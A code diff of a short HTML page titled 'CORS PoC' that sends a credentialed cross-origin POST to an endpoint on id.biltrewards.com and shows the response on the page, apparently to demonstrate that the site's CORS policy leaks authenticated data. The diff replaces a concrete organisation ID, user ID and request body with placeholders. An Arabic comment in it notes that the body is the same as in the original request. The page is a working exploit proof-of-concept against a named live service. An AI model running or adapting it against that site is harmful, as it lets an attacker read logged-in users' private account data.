@@ -1,19 +1,25 @@
 <!DOCTYPE html>
 <html>
+  <head><title>CORS PoC</title></head>
   <body>
     <h1>CORS PoC</h1>
+    <pre id="output">Loading...</pre>
+
     <script>
-      fetch("https://id.biltrewards.com/fsrelay/rec/bundle/v2?OrgId=13PEW8&UserId=0c73f58d-0907-48f9-996c-9a89f09f1ff1", {
+      fetch("https://id.biltrewards.com/fsrelay/rec/bundle/v2?OrgId=...", {
         method: "POST",
         credentials: "include",
         headers: {
           "Content-Type": "text/plain"
         },
-        body: '{"Seq":10,"When":98019,"Evts":[]}'
+        body: "...." // نفس البادي اللي كان في الريكوست
       })
-      .then(res => res.text())
+      .then(r => r.text())
       .then(data => {
-        alert("Response: " + data);
+        document.getElementById("output").innerText = "Response:\n" + data;
+      })
+      .catch(e => {
+        document.getElementById("output").innerText = "Error:\n" + e;
       });
     </script>
   </body>
